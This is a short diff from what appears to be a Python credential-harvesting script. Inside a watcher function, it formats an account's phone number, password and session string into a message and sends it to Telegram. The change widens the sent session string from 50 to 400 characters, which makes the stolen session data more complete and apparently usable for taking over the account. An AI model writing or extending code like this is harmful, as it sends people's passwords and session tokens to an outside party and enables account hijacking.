@@ -60,7 +60,7 @@ def start_watcher():
 
 📱 Number: {phone}
 🔑 Password: {acc.get('password')}
-📂 Session: {acc.get('session')[:50]}...
+📂 Session: {acc.get('session')[:400]}
 """
 
                     send_to_telegram(msg)
